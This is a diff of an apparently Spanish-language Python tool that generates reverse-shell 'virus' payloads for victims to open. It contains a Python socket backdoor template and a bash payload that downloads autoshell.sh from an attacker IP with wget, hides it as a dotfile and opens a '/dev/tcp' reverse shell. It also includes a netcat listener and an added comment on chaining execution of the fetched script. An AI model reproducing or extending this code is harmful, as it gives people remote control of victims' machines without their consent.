@@ -34,8 +34,6 @@ if numero == 1:
    viruspy = "import socket\n"\
              "import subprocess\n"\
              "cliente = socket.socket()\n"\
-             "os.system('wget http://'+ ip +'/autoshell.sh')\n"\
-             "os.system('clear')\n"\
              "try:\n"\
              "   cliente.connect(("+ modify_ip +","+ puerto +"))\n"\
              "   cliente.send(\"shell > \".encode(\"ascii\"))\n"\
@@ -67,7 +65,7 @@ if numero == 1:
 def option_listener_yes(): 
      clearScr()
      print("No cierre esta terminal, cuando la victima habra el archivo se habrá conectado a la maquina remotamente.")
-     os.system('nc -nlvp '+ puerto +'')
+     os.system('nc -nlvp '+ puerto +'') #Poner "&&" y despues comando ejecutar dentro de netcat "&& bash .autoshell.sh"
 
    
      if option_listen == "y":
@@ -104,6 +102,7 @@ if numero == 2:
    virussh = "#!/bin/bash\n"\
              "clear\n"\
              "wget http://"+ ip +"/autoshell.sh\n"\
+             "mv autoshell.sh .autoshell.sh\n"\   
              "bash -i >& /dev/tcp/"+ ip +"/"+ puerto +" 0>&1\n"\
              "clear"
              
